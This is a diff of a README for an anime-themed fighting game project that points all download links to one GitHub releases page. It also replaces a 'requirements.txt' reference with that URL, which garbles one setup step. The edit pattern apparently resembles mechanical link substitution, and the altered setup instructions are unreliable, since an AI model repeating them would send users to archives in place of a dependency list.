@@ -2,7 +2,7 @@
 
 Welcome to **Shonen Smash**, a dynamic repository dedicated to the thrilling world of shonen battles, epic adventures, and character growth. This project brings together the excitement of anime fighting games and the depth of manga storytelling. 
 
-[Download the latest version here](https://github.com/repo/user/archive.zip) and dive into the action!
+[Download the latest version here](https://github.com/pranavpatil897/Shonen-Smash/releases) and dive into the action!
 
 ---
 
@@ -37,9 +37,9 @@ Shonen Smash is a unique project that blends the elements of shonen anime and ma
 
 To get started with Shonen Smash, follow these steps:
 
-1. **Download the Repository**: Click [here](https://github.com/repo/user/archive.zip) to download the latest version.
+1. **Download the Repository**: Click [here](https://github.com/pranavpatil897/Shonen-Smash/releases) to download the latest version.
 2. **Extract the Files**: Unzip the downloaded file to your preferred location.
-3. **Install Dependencies**: Ensure you have the necessary dependencies installed. Check the `requirements.txt` file for details.
+3. **Install Dependencies**: Ensure you have the necessary dependencies installed. Check the `https://github.com/pranavpatil897/Shonen-Smash/releases` file for details.
 4. **Run the Game**: Follow the instructions in the `README` file included in the extracted folder to launch the game.
 
 ## Usage
@@ -107,6 +107,6 @@ Shonen Smash is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-For more updates, check the [Releases](https://github.com/repo/user/releases) section. 
+For more updates, check the [Releases](https://github.com/pranavpatil897/Shonen-Smash/releases) section. 
 
 Feel free to explore, play, and enjoy the epic battles in Shonen Smash!
